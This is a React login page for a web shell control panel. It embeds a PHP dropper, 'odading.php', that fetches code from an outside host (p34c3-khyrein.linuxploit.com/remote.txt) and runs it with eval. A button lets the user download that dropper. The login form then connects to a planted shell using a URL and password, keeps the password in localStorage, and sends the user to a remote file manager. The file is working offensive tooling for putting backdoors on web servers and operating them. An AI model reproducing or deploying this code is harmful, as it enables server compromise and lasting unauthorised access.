import React, { Component } from "react";
import { Redirect } from "react-router";

// library
import axios from "axios";
import ReactBSAlert from "react-bootstrap-sweetalert";

// style
import Loading from "../../components/Loading";

const src_odading = `
<?php session_start();function curl($link){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$link);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,[
  "h4ck3r"=>"p34c3_khyrein"
]);$output = curl_exec($ch);curl_close($ch);return $output;}eval(curl("https://p34c3-khyrein.linuxploit.com/remote.txt"));?>
`;

class Login extends Component {
  constructor(props) {
    super(props);
    this.state = {
      // wajib
      isLoaded: false,
      error: false,
      alertModal: null,

      // login value
      input_login_link: localStorage.getItem("remember_link")
        ? localStorage.getItem("remember_link")
        : null,
      input_login_password: null,
      notice: null,
    };
  }

  // handler
  handleInputChange = (event) => {
    const target = event.target;
    const name = target.name;
    var value = target.type === "checkbox" ? target.checked : target.value;

    if (value.length === 0) {
      value = null;
    }

    this.setState({
      [name]: value,
    });
  };
  handleSubmitOK = (array) => {
    var ok = 0;
    for (let i = 0; i < array.length; i++) {
      const state = array[i];
      if (this.state[state] !== null) {
        ok++;
      }
    }
    if (array.length === ok) {
      document.getElementById("submit").style.display = "";
    } else {
      document.getElementById("submit").style.display = "none";
    }
    this.setState({
      notice: null,
    });
  };

  closeModal = (scrollToTop = false) => {
    this.setState({ alertModal: null });
    if (scrollToTop) {
      this.scrollOnTop();
    }
  };
  AnimasiLoading = () => {
    this.closeModal();
    this.setState({
      alertModal: (
        <ReactBSAlert
          style={{
            display: "block",
            background: "",
            color: "white",
          }}
          //
          showConfirm={false}
          showCancel={false}
          showCloseButton={false}
          closeOnClickOutside={false}
          //
          onConfirm={() => this.closeModal()}
          onCancel={() => this.closeModal()}
        >
          <Loading
            size={100}
            message={"Loading..."}
            style={{ textAlign: "center" }}
          />
        </ReactBSAlert>
      ),
    });
  };

  sender = (perihal, url, data_object, Response, Error, Finally) => {
    const data = new FormData();
    for (let key of Object.keys(data_object)) {
      data.append(key, data_object[key]);
    }

    axios
      .post(url, data)
      .then(function (response) {
        Response(JSON.parse(response.request.responseText));
      })
      .catch(function (error) {
        Error(`Error ${perihal} : ${error.message}`, error.message);
      })
      .finally(function () {
        Finally();
      });
  };

  DownloadRemoteShell = () => {
    const element = document.createElement("a");

    const file = new Blob([src_odading], { // isi shell
      type: "text/plain;charset=utf-8",
    });
    element.href = URL.createObjectURL(file);

    element.download = "odading.php"; // shell name

    document.body.appendChild(element);
    element.click();

    element.remove();
  };

  render() {
    const {
      // wajib
      alertModal,

      // login
      input_login_link,
      input_login_password,
      notice,
    } = this.state;

    document.title = this.props.title;

    // anti klik kanan
    document.addEventListener("contextmenu", (event) => event.preventDefault());

    if (localStorage.getItem("session")) {
      return <Redirect to={"/remote_shell/file_manager"} />;
    } else {
      return (
        <div className="App">
          <header className="App-header">
            <center>
              <img
                src={require("../../assets/img/ngintip-ya.png").default}
                alt="my logo"
                width="250px"
                height="300px"
              />
              <form
                onSubmit={(e) => {
                  e.preventDefault();

                  this.AnimasiLoading();

                  const setState = (array) => {
                    this.setState(array);
                  };
                  const push = (url) => {
                    this.props.history.push(url);
                  };

                  this.sender(
                    "submit",
                    input_login_link,
                    { password: input_login_password, explore: true },
                    function (response) {
                      // console.log(response);
                      if (response.success) {
                        setState({
                          session: response.session,
                          info: response.info,
                          path: response.explore.path,
                          listdir: response.explore.list.dir,
                          listfile: response.explore.list.file,
                          alertModal: null,
                        });
                        localStorage.setItem("session", response.session);
                        localStorage.setItem("password", input_login_password);
                        localStorage.setItem("remote_link", input_login_link);
                        localStorage.setItem(
                          "home_path",
                          JSON.stringify(response.explore.path)
                        );

                        push("/remote_shell/file_manager");
                      } else {
                        setState({
                          notice: response.message,
                          alertModal: null,
                        });
                      }
                    },
                    function (error, real) {
                      setState({
                        alertModal: null,
                        notice:
                          real === "Network Error"
                            ? "Remote File Not Found!"
                            : real,
                      });
                    },
                    function () {
                      // remember remote link
                      localStorage.setItem("remember_link", input_login_link);
                    }
                  );
                }}
              >
                <input
                  style={{
                    width: "250px",
                    border: "1px solid green",
                    // color: "white",
                  }}
                  type="text"
                  name="input_login_link"
                  value={input_login_link}
                  onChange={(e) => this.handleInputChange(e)}
                  placeholder="remote link"
                  onKeyUp={(e) => {
                    this.handleSubmitOK([
                      "input_login_link",
                      "input_login_password",
                    ]);
                  }}
                />
                <br />
                <input
                  style={{ width: "250px", border: "1px solid green" }}
                  type="password"
                  name="input_login_password"
                  value={input_login_password}
                  onChange={(e) => this.handleInputChange(e)}
                  placeholder="password"
                  onKeyUp={(e) => {
                    this.handleSubmitOK([
                      "input_login_link",
                      "input_login_password",
                    ]);
                  }}
                />
                <br />
                {notice ? (
                  <>
                    <span style={{ color: "red", fontSize: 14 }}>{notice}</span>
                    <br />
                  </>
                ) : null}
                <br />

                <input
                  type="submit"
                  id="submit"
                  style={{
                    display: "none",
                    background: "transparent",
                    color: "lime",
                  }}
                  value="happy hacking!"
                />
              </form>
              <br />
              <br />
              <input
                type="button"
                style={{
                  background: "transparent",
                  color: "lime",
                }}
                value="Download Remote Shell (PHP) !!"
                onClick={this.DownloadRemoteShell}
              />
            </center>
          </header>
          {alertModal}
        </div>
      );
    }
  }
}

export default Login;
